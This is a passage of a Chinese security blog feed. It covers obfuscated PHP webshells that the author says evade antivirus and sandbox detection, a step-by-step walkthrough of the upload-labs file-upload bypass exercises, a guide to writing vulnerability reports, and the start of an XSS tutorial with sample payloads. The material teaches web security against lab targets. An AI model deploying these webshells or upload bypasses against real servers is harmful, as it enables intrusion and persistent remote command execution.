class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结合前面的加密绕过思路，加密call_user_func函数：Y2FsbF91c2VyX2Z1bmM&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function DD($Data) &#123;</span><br><span class="line">    return base64_decode($Data);</span><br><span class="line">&#125;</span><br><span class="line">$f=$_GET[&#x27;func&#x27;];</span><br><span class="line">$v=$_GET[&#x27;xxx&#x27;];</span><br><span class="line">DD(&quot;Y2FsbF91c2VyX2Z1bmM=&quot;)($f,$v);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>该例子仍能被河马查杀。可以采用更复杂的加密函数尝试。</p><h2 id="8-3-传参混淆"><a href="#8-3-传参混淆" class="headerlink" title="8.3 传参混淆"></a>8.3 传参混淆</h2><p>使用php中的分隔函数，用某个符号把传入的参数做一个分隔，再结合回调函数调用执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DD</span>(<span class="params"><span class="variable">$Data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$Data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;!&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">DD</span>(<span class="string">&quot;Y2FsbF91c2VyX2Z1bmM=&quot;</span>)(<span class="variable">$a</span>[<span class="number">0</span>],<span class="variable">$a</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者可以传入 ?s&#x3D;system!echo hack 达到目的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.*/test.php?s=system!echo hack</span><br></pre></td></tr></table></figure><p>该方法可以避开河马查杀。 VT上通过所有杀软。沙箱检测也顺利绕过。</p><h1 id="9-upload-labs-21关"><a href="#9-upload-labs-21关" class="headerlink" title="9 upload-labs 21关"></a>9 upload-labs 21关</h1><h3 id="Pass-01-前端检验绕过"><a href="#Pass-01-前端检验绕过" class="headerlink" title="Pass-01 前端检验绕过"></a>Pass-01 前端检验绕过</h3><p>js对上传做了限制，将相应的js语句删掉，或者将js禁用。</p><hr><h3 id="Pass-02-MIME类型"><a href="#Pass-02-MIME类型" class="headerlink" title="Pass-02 MIME类型"></a>Pass-02 MIME类型</h3><p>用burp进行抓包，修改信息头。</p><p>将<code>Content-Type: application/x-php</code>修改为<code>Content-Type: image/jpeg</code>。</p><hr><h3 id="Pass-03-黑名单绕过之php3、php5"><a href="#Pass-03-黑名单绕过之php3、php5" class="headerlink" title="Pass-03 黑名单绕过之php3、php5"></a>Pass-03 黑名单绕过之php3、php5</h3><p>文件的后缀名进行了限制。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="title function_">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br></pre></td></tr></table></figure><p>但是，在php中，.php3、.php4、.php5、.pht、.phtml、.phps 的文件都会被解析为 php 文件。</p><p>因此，我们需要将原来的<code>kali.php</code>改为<code>kali.phtml</code>即可。当然这种方法也只有低版本的php中才能复现。</p><p>可以上传.php5文件，但该文件不一定能够执行。</p><hr><h3 id="Pass-04-黑名单绕过-htaccess和文件名叠加特性绕过"><a href="#Pass-04-黑名单绕过-htaccess和文件名叠加特性绕过" class="headerlink" title="Pass-04 黑名单绕过.htaccess和文件名叠加特性绕过"></a>Pass-04 黑名单绕过.htaccess和文件名叠加特性绕过</h3><h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><p>环境：Apache，没限制.htaccess文件。</p><p>.htaccess 是配置文件，通常位于网站的根目录或特定的文件中，并影响该目录及子目录。每个目录都可以有这个文件。.htaccess文件可以通过文本编辑器直接进行修改或创建，且修改后会立马生效，不用重启。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">文件名：.htaccess</span><br><span class="line"></span><br><span class="line">上传给Apache的任意文件类型，都当作php文件来解析</span><br><span class="line">&lt;FilesMatch &quot;&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"># 将后缀名为 h-t-m 的文件解析为 php 脚本执行</span><br><span class="line">AddType application/x-httpd-php .h-t-m</span><br><span class="line"># 将后缀名为 h-t-m 的文件用 php处理器 来处理，效果同上</span><br><span class="line">AddHandler php5-script .h-t-m</span><br><span class="line"># 将所有文件解析为 php 脚本执行</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><blockquote><p>这一步phpstudy8.1失败，phpstudy2018成功</p></blockquote><hr><h4 id="分号配合IIS解析漏洞"><a href="#分号配合IIS解析漏洞" class="headerlink" title="分号配合IIS解析漏洞"></a>分号配合IIS解析漏洞</h4><p>环境：IIS</p><p><code>muma.asp;.jpg</code>可以绕过图片限制，含有“.asp”，可以当做asp文件正常解析。</p><hr><h4 id="冒号配合PHP和Windows文件命名环境的叠加特性"><a href="#冒号配合PHP和Windows文件命名环境的叠加特性" class="headerlink" title="冒号配合PHP和Windows文件命名环境的叠加特性"></a>冒号配合PHP和Windows文件命名环境的叠加特性</h4><p>利用PHP和Windows环境的叠加特性，在Windows直接修改文件名称，不能直接加冒号。我们先以图片的格式上传，然后抓包，修改文件名称，加上冒号，上传一个名为<code>123.php:.jpg</code>的文件。</p><p>但是，这样上传的是0KB的123.php文件。在抓包工具中将文件名改为<code>123.&lt;</code>或<code>123.&lt;&lt;&lt;</code>或<code>123.&gt;&gt;&gt;</code>或<code>123.&gt;&gt;&lt;</code>后再次上传，重写123.php文件内容，WebShell代码就会写入原来的空文件中。</p><p>这种方式分两步：1.上传文件；2.追加写入内容。</p><hr><h3 id="Pass-05-user-ini"><a href="#Pass-05-user-ini" class="headerlink" title="Pass-05 .user.ini"></a>Pass-05 .user.ini</h3><p>黑名单中没有<code>.ini</code>，<code>php.ini</code> 是 php 的配置文件，<code>.user.ini</code> 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。</p><blockquote><p>注意：该pass要求php版本大于等于5.3.0版本</p><p>CGI／FastCGI模式</p></blockquote><p>创建 <code>.user.ini </code>文件，内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=userini.baidu</span><br><span class="line">//指定一个文件，自动包含在要执行的文件后。</span><br></pre></td></tr></table></figure><p>上传<code>.user.ini</code>。</p><p>上传<code>userini.baidu</code>文件，内容为一句话木马。</p><p>再访问上传目录下的<code>readme.php</code>(经测试，任意php文件都可以)，即可将<code>userini.baidu</code>内的内容脚本正常执行。</p><p>例如：<a href="http://localhost/upload-labs/upload/readme.php">http://localhost/upload-labs/upload/readme.php</a></p><hr><h3 id="Pass-06-大小写绕过"><a href="#Pass-06-大小写绕过" class="headerlink" title="Pass-06 大小写绕过"></a>Pass-06 大小写绕过</h3><p>上传时后缀.php改为.phP等大写字母。</p><blockquote><p>用蚁剑测试时，CGI模式失败，Apache模式成功。</p></blockquote><h3 id="Pass-07-空格点"><a href="#Pass-07-空格点" class="headerlink" title="Pass-07 空格点"></a>Pass-07 空格点</h3><p>环境：Windows</p><p>抓包，文件名后缀.php改为<code>.php .</code>，上传后，服务器文件名后缀还是.php。</p><h3 id="Pass-08-空格点、点空格"><a href="#Pass-08-空格点、点空格" class="headerlink" title="Pass-08 空格点、点空格"></a>Pass-08 空格点、点空格</h3><p>环境：Windows</p><p>抓包，文件名后缀.php改为<code>.php .</code>或<code>.php.空格</code> ，上传后，服务器文件名后缀还是.php。</p><h3 id="Pass-09-基于文件流特性-DATA绕过"><a href="#Pass-09-基于文件流特性-DATA绕过" class="headerlink" title="Pass-09 基于文件流特性::$DATA绕过"></a>Pass-09 基于文件流特性::$DATA绕过</h3><p>Windows下ntfs文件流特性。</p><p>源代码没有以下限制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA（源代码没有这句）</span><br></pre></td></tr></table></figure><p>抓包，文件名后缀.php改为<code>.php::$DATA</code> ，上传后，服务器文件名后缀还是.php。</p><h3 id="Pass-10-点空格点"><a href="#Pass-10-点空格点" class="headerlink" title="Pass-10 点空格点"></a>Pass-10 点空格点</h3><p>抓包，文件名后缀.php改为<code>.php. .</code>，上传后，服务器文件名后缀还是.php。</p><h3 id="Pass-11-双写"><a href="#Pass-11-双写" class="headerlink" title="Pass-11 双写"></a>Pass-11 双写</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = <span class="title function_">str_ireplace</span>($deny_ext,<span class="string">&quot;&quot;</span>, $file_name);</span><br></pre></td></tr></table></figure><p><strong>方法一</strong></p><p>直接上传1.pphphp木马文件，上传后，服务器文件名后缀还是.php。</p><p><strong>方法二</strong></p><p>上传1.php木马文件，抓包拦截，修改filename为1.pphphp，上传后，服务器文件名后缀还是.php。</p><h3 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12 %00截断"></a>Pass-12 %00截断</h3><blockquote><p>php版本调至5.2.17 </p><p>php magic_quotes_gpc&#x3D;Off</p></blockquote><p>当 PHP 在处理文件名或路径时，如果遇到 URL 编码的 %00，它会被解释为一个空字节（ASCII 值为 0）。在php5.3以前，PHP 会将这个空字节转换为 \000 的形式。</p><p>而恰恰在php5.3以前，文件名出现\0000,会导致文件名被截断，只保留%00之前的部分。这样的情况可能会导致文件被保存到一个意外的位置，从而产生安全风险。</p><p>这是因为php语言的底层是c语言，而\0在c语言中是字符串的结束符，所以导致00截断的发生。</p><p>点击上传1.jpg木马图片，抓包拦截，在POST的路径后加上1.php%00，后面不管是什么东西都会被截断掉，然后经过move_uploaded_file函数将临时文件重新复制给我们的截断之前的文件路径。即把上传的木马图片内容存到1.php中。最后upload目录下保存了1.php文件。</p><h3 id="Pass-13-00绕过"><a href="#Pass-13-00绕过" class="headerlink" title="Pass-13 00绕过"></a>Pass-13 00绕过</h3><blockquote><p>php版本调至5.2.17 </p><p>php magic_quotes_gpc&#x3D;Off</p></blockquote><p>本关接受值从get变成了post，它俩的区别就是get会自行解码，而post不会解码，所以需要对%00进行解码。所以在这一关我们就需要在web.php后面加一个占位符，将其16进制改为00（空字节），这样控制符就出现了，最后在上传文件的时候就会触发\00截断。</p><p>上传1.jpg木马图片，抓包拦截，在下方..&#x2F;upload&#x2F;后加上1.php%，点击Hex，以16进制模式浏览，找到php后面的%，将其16进制换成00，上传后，服务器文件名是刚才指定的1.php。（上传php文件也可以，只要内容是木马就行，然后filename改成后缀为.jpg来通过白名单，在&#x2F;upload&#x2F;后指定一个php文件名，再跟一个字符，在Hex模式中将这个字符改为00就行了）</p><h3 id="Pass-14-图片🐎"><a href="#Pass-14-图片🐎" class="headerlink" title="Pass-14 图片🐎"></a>Pass-14 图片🐎</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd执行</span><br><span class="line">copy /b test.png+1.php muma.png</span><br><span class="line">test.png普通图片|1.php木马|muma.png图片马</span><br></pre></td></tr></table></figure><h3 id="Pass-15-图片🐎"><a href="#Pass-15-图片🐎" class="headerlink" title="Pass-15 图片🐎"></a>Pass-15 图片🐎</h3><p>同Pass-14。</p><h3 id="Pass-16-图片🐎"><a href="#Pass-16-图片🐎" class="headerlink" title="Pass-16 图片🐎"></a>Pass-16 图片🐎</h3><p>php开启php_exif，上传图片🐎。</p><p>利用<code>include.php?file=图片路路径</code>加载即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">http://localhost/upload-labs/include.php?file=upload/8720240816064213.png</span><br></pre></td></tr></table></figure><h3 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass-17 二次渲染"></a>Pass-17 二次渲染</h3><p>php开启php_gd2。</p><h3 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18 条件竞争"></a>Pass-18 条件竞争</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">该代码执行后新建一个包含木马的文件</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;qing.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//txt中一般写一句话木马</span></span><br></pre></td></tr></table></figure><p>Burp Intruder创建两个，一个发上传php文件，一个发访问php文件，赶在服务器删除文件之前访问并生成木马文件。</p><blockquote><p>在 Intruder 下的 Positions 页面可以看到我们上传文件抓到的包，我们只需一直发送这个包即可。首先在 Positions 页面点击<code>clear §</code>，转到 Payloads 页面修改 Payload type，选择 Null payloads。之后该页面就会多一个条目 Payload Option [Null payloads]，这里选择 Continue indefinitely（无限重复）。</p></blockquote><h3 id="Pass-19-条件竞争之重命名竞争"><a href="#Pass-19-条件竞争之重命名竞争" class="headerlink" title="Pass-19 条件竞争之重命名竞争"></a>Pass-19 条件竞争之重命名竞争</h3><p>环境：老版本Apache（2.x之后为新版本）</p><p>Apache默认把.7z后缀的文件当做php解析。</p><p>muma.php.7z</p><h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20 /."></a>Pass-20 <code>/.</code></h3><p>上传php，保存名称直接在文件名末尾加上<code> /.</code></p><h3 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h3><p>来源于CTF，审计代码。</p><blockquote><p>渗透测试 黑盒测试</p><p>代码审计 白盒测试</p><p>灰盒测试 黑+白</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何写一篇合格的漏洞报告</title>
      <link href="/2024/10/21/%E5%A6%82%E4%BD%95%E5%86%99%E4%B8%80%E7%AF%87%E5%90%88%E6%A0%BC%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A/"/>
      <url>/2024/10/21/%E5%A6%82%E4%BD%95%E5%86%99%E4%B8%80%E7%AF%87%E5%90%88%E6%A0%BC%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="1-为什么要写一篇合格的漏洞报告？"><a href="#1-为什么要写一篇合格的漏洞报告？" class="headerlink" title="1 为什么要写一篇合格的漏洞报告？"></a>1 为什么要写一篇合格的漏洞报告？</h2><p>逆向思维，当不合格的报告写多了会出现以下情况：</p><ol><li>审核看到你的ID就烦,假如你是审核你烦不烦</li><li>你的报告总是审核的比别人慢，而且忽略的概率比别人高</li><li>当你过几个月再去看自己的漏洞报告发现自己都看不懂,没法复盘</li></ol><h2 id="2-合格的漏洞报告包含哪些元素？"><a href="#2-合格的漏洞报告包含哪些元素？" class="headerlink" title="2 合格的漏洞报告包含哪些元素？"></a>2 合格的漏洞报告包含哪些元素？</h2><ol><li>漏洞标题</li><li>漏洞简述</li><li>漏洞复现</li><li>修复建议</li><li>利用poc</li></ol><h3 id="2-1-漏洞标题模板"><a href="#2-1-漏洞标题模板" class="headerlink" title="2.1 漏洞标题模板"></a>2.1 漏洞标题模板</h3><p>(1) XX游戏论坛-用户登录处-短信验证码发送功能存在短信轰炸漏洞</p><p>(2) XX书店集团有限公司域名-退出登录处存在url跳转漏洞</p><p>(3) xx企业管理系统-安全管理功能-增加管理员处存在垂直越权漏洞</p><h3 id="2-2-漏洞简述"><a href="#2-2-漏洞简述" class="headerlink" title="2.2 漏洞简述"></a>2.2 漏洞简述</h3><p>简单表达下是什么漏洞(后面chatgpt会讲)</p><p>举例spf: xxx集团有限公司域名-存在spf邮件伪造漏洞,由于该域名邮箱是xxx集团有限公司使用的邮箱地址,所以攻击者可以假装成任何xxx有限公司的邮箱 <a href="mailto:&#x78;&#x78;&#64;&#120;&#120;&#120;&#x78;&#x2e;&#x63;&#x6e;">&#x78;&#x78;&#64;&#120;&#120;&#120;&#x78;&#x2e;&#x63;&#x6e;</a> 对被攻击者进行钓鱼攻击等。</p><h3 id="2-3-漏洞复现"><a href="#2-3-漏洞复现" class="headerlink" title="2.3 漏洞复现"></a>2.3 漏洞复现</h3><p>(1) 浏览器访问: xxx.xxx.com</p><p>[截图]</p><blockquote><p>注意说明清楚来源，例如某个APP的漏洞，需要说明在哪个软件平台搜索下载的，什么版本，测试用的手机信息等。</p></blockquote><p>(2) 点击短信验证位置如下:</p><p>[截图]</p><p>(3) 输入手机号,点击发送短信进行抓包:</p><p>[截图]</p><blockquote><p>敏感信息注意打码，特别是手机号，可能会被致电询问修复建议或找麻烦。</p></blockquote><p>(4) 数据包如下：</p><p>[截图]+[文本请求包]</p><p>(5) 进行并发：</p><p>(6) 手机号收到大量验证码：</p><p>[手机验证码截图]</p><h3 id="2-4-修复建议"><a href="#2-4-修复建议" class="headerlink" title="2.4 修复建议"></a>2.4 修复建议</h3><p>直接ChatGPT等AI工具生成。</p><h2 id="3-利用好ChatGPT让写报告不再成为问题"><a href="#3-利用好ChatGPT让写报告不再成为问题" class="headerlink" title="3 利用好ChatGPT让写报告不再成为问题"></a>3 利用好ChatGPT让写报告不再成为问题</h2><p><strong>举例越权</strong></p><p>漏洞危害：</p><p>问：我发现了一个网站存在垂直越权漏洞，请帮我写一下这个漏洞的危害。</p><p>漏洞简述：</p><p>问：帮我简单描述一下垂直越权漏洞。</p><p>修复建议：</p><p>问：写出这个漏洞的修复建议。</p><blockquote><p>写的报告一定要以普通非安全工程师也能看懂为基准。</p></blockquote><blockquote><p>本篇文章内容来自于网络</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 漏洞报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS 跨站脚本攻击</title>
      <link href="/2024/10/19/XSS%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/19/XSS%20%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="1-XSS漏洞基础"><a href="#1-XSS漏洞基础" class="headerlink" title="1 XSS漏洞基础"></a>1 XSS漏洞基础</h2><blockquote><p><a href="https://websec.readthedocs.io/zh/latest/vuln/xss/index.html">https://websec.readthedocs.io/zh/latest/vuln/xss/index.html</a></p></blockquote><h3 id="1-1-什么是XSS"><a href="#1-1-什么是XSS" class="headerlink" title="1.1 什么是XSS"></a>1.1 什么是XSS</h3><p>XSS全称（Cross Site Scripting）跨站脚本攻击，是最常见的Web应用程序安全漏洞之一，仅次于SQL注入。XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。由此可知，XSS属于客户端攻击，受害者最终是用户，但特别要注意的是网站管理人员也属于用户之一。这就意味着XSS可以进行“服务端”攻击，因为管理员要比普通用户的权限大得多，一般管理员都可以对网站进行文件管理，数据管理等操作，而攻击者一般也是靠管理员身份作为“跳板”进行实施攻击。</p><h3 id="1-2-XSS漏洞出现的原因"><a href="#1-2-XSS漏洞出现的原因" class="headerlink" title="1.2 XSS漏洞出现的原因"></a>1.2 XSS漏洞出现的原因</h3><p>程序对输入输出的控制不够严格，导致“精心构造”的脚本输入后，在输出到前端时被浏览器当作有效代码解析执行从而产生危害。</p><p><img src="https://img.shalom86012.eu.org/imgs/xssyuanli.png"></p><h3 id="1-3-XSS的危害"><a href="#1-3-XSS的危害" class="headerlink" title="1.3 XSS的危害"></a>1.3 XSS的危害</h3><p>a.劫持用户cookie是最常见的跨站攻击形式，通过在网页中写入并执行脚本执行文件（多数情况下是JavaScript脚本代码），劫持用户浏览器，将用户当前使用的sessionID信息发送至攻击者控制的网站或服务器中。</p><p>b.框架钓鱼：利用XSS漏洞，我们可以在网页中插入恶意js代码，通过js代码，我们可以干很多事情，例如伪造一个登陆页面。当用户访问该网页时，就会自动弹出登陆页面，如果用户信以为真，输入了用户名与密码，信息就会传输到攻击者的服务器中，完成账号窃取。</p><p>c.网站挂马<br>d.键盘记录</p><h3 id="1-4-XSS分类"><a href="#1-4-XSS分类" class="headerlink" title="1.4 XSS分类"></a>1.4 XSS分类</h3><h4 id="1-4-1-反射型-非持久性"><a href="#1-4-1-反射型-非持久性" class="headerlink" title="1.4.1 反射型(非持久性)"></a>1.4.1 反射型(非持久性)</h4><p>只对本次访问有影响，传参中有攻击代码，交互的数据一般不会被存在数据库中，一次性，所见即所得，一般出现在查询类页面等。</p><p>攻击者构造恶意的 URL，其中包含恶意脚本。当用户点击带有恶意参数的 URL 时，服务器将恶意脚本作为响应的一部分返回给用户浏览器，并在浏览器中执行。</p><p><strong>payload</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>confirm(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1-4-2-存储型-持久性"><a href="#1-4-2-存储型-持久性" class="headerlink" title="1.4.2 存储型(持久性)"></a>1.4.2 存储型(持久性)</h4><p>存储到网站（数据库，日志或者其他东西），永久性存储，不带攻击传参，访问链接，如果生效就是存储型XSS。</p><p>存储型 XSS 发生在网站存储用户提交的数据，且未经过滤或转义的情况下直接在网页中显示。攻击者提交包含恶意脚本的数据，然后其他用户在访问包含该数据的页面时，恶意脚本将在他们的浏览器中执行。</p><h4 id="1-4-3-Dom型-持久性或非持久性"><a href="#1-4-3-Dom型-持久性或非持久性" class="headerlink" title="1.4.3 Dom型(持久性或非持久性)"></a>1.4.3 Dom型(持久性或非持久性)</h4><p>DOM 型的 XSS 注入与反射型原理类似，只不过 DOM 型的 XSS 注入不需要经过后端代码处理，不与后台服务器产生数据交互，而是在前端。<br>JavaScript 调用 DOM 元素时可能产生的漏洞，可能触发 DOM 型 XSS 的 JavaScript 代码，大部分属于反射型XSS。</p><p>闭合标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&quot;(111)&quot;</span><br><span class="line">&#x27; onclick=&quot;(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><h5 id="1-什么是Dom"><a href="#1-什么是Dom" class="headerlink" title="1) 什么是Dom"></a>1) 什么是Dom</h5><p>DOM，全称Document Object Model，是中立于平台和语言的接口，它允许程序和脚本动态地访问和更新文档的内容、结构和样式。</p><h5 id="2-Dom型Xss简介"><a href="#2-Dom型Xss简介" class="headerlink" title="2) Dom型Xss简介"></a>2) Dom型Xss简介</h5><p>DOM型XSS其实是一种特殊类型的XSS，它是基于DOM文档对象模型的一种漏洞。<br>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p><h5 id="3-Dom型XSS的危害"><a href="#3-Dom型XSS的危害" class="headerlink" title="3) Dom型XSS的危害"></a>3) Dom型XSS的危害</h5><blockquote><p>DOM-XSS不经过服务端，只看服务端的日志和数据库，很难排查到。<br>DOM-XSS一般是通杀浏览器的。<br>DOM-XSS一般是被攻击的时候就执行了XSS，由于是前端DOM操作导致，很难留下痕迹。</p></blockquote><hr><h5 id="4-Document对象属性"><a href="#4-Document对象属性" class="headerlink" title="4) Document对象属性"></a>4) Document对象属性</h5><p>Document的存在可以让浏览器获取网页信息，然后用JS来填充来节约服务器性能。<br>因为前端代码都在客户浏览器上面执行和服务器无关，另外，XSS攻击的目标是目标浏览器，不是攻击目标服务器。</p><p><strong>常见的Document对象属性</strong></p><blockquote><p>cookie &#x2F;&#x2F;设置或读取当前文档有关的所有cookie<br>domain &#x2F;&#x2F;返回当前文档的域名<br>lastModified &#x2F;&#x2F;返回文档被最后修改的日期和时间<br>referrer &#x2F;&#x2F;返回载入当前文档的来源文档的URL<br>title &#x2F;&#x2F;返回当前文档的标题<br>URL &#x2F;&#x2F;返回当前文档的URL<br>write() &#x2F;&#x2F;向文档写HTML表达式或JS代码</p></blockquote><p>document.cookie （XSS必备函数）<br>document.lastModified （识别伪静态必备）<br>document.write() （Dom型XSS常见存在方式）</p><h5 id="5-Dom型XSS的三种常见状态"><a href="#5-Dom型XSS的三种常见状态" class="headerlink" title="5) Dom型XSS的三种常见状态"></a>5) Dom型XSS的三种常见状态</h5><h6 id="5-1-document-write-（网页跳转）"><a href="#5-1-document-write-（网页跳转）" class="headerlink" title="5.1) document.write()（网页跳转）"></a>5.1) document.write()（网页跳转）</h6><p>假设一个网页的源代码如下，访问该网页，并在URL后加上”<code>?code=&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code>“，访问URL，即可弹窗XSS。</p><p>例如：<code>file:///D:/*/test.html?code=&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Head<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;p&gt;Hello Document!&lt;/p&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> pos=<span class="variable language_">document</span>.<span class="property">documentURI</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;code=&quot;</span>)+<span class="number">5</span>; <span class="comment">//取name=后面的值</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> username = <span class="built_in">unescape</span>(<span class="variable language_">document</span>.<span class="property">documentURI</span>.<span class="title function_">substring</span>(pos,<span class="variable language_">document</span>.<span class="property">documentURI</span>.<span class="property">length</span>)); <span class="comment">//取name=后面的值</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">write</span>(username);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span 